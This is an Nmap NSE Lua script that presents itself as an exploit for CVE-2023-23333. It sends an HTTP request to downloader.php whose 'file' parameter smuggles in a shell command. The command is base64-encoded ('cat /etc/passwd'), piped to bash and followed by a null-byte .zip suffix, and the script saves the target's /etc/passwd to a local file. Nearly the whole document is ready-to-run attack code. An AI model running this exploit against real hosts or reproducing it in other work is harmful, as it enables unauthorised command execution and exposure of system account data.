-- File: http_request_with_verification_v4.nse

description = [[
  Nmap script to exploit CVE-2023-23333. It dumps the /etc/passwd file from the remote system.
  (Note: Ensure you have LuaSocket installed on your system.)
  Arguments:
    - outputfile: The path to the output file where /etc/passwd will be saved.
]]

-- Load the LuaSocket library
local socket = require("socket.http")
local ltn12 = require("ltn12")

-- The function that will be called by Nmap when the script runs.
action = function(host, port)
  local relative_path = "/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip"
  local url = "http://" .. host .. ":" .. port .. relative_path -- Construct complete URL

  -- Check if the output file argument is provided
  local output_file = stdnse.get_script_args('outputfile') or "./CVE-2023-23333-output.txt"

  -- Function to handle HTTP request and response verification
  local function http_request_and_verify(url, output_file)
    local response_body = {}
    local result, response_code, response_headers, response_status = socket.request{
      url = url,
      sink = ltn12.sink.table(response_body)
    }

    if result then
      local file = io.open(output_file, "w")
      if file then
        file:write(table.concat(response_body))
        file:close()
        print("HTTP request successful. Response saved to " .. output_file)
      else
        print("Error: Failed to open file for writing.")
      end
    else
      print("Error: HTTP request failed.")
      if response_status then
        print("Response Status:", response_status)
      end
    end
  end

  -- Attempt to make the HTTP request and handle errors
  local status, err = pcall(http_request_and_verify, url, output_file)
  if not status then
    print("Error: An unexpected error occurred:", err)
  end
end

      
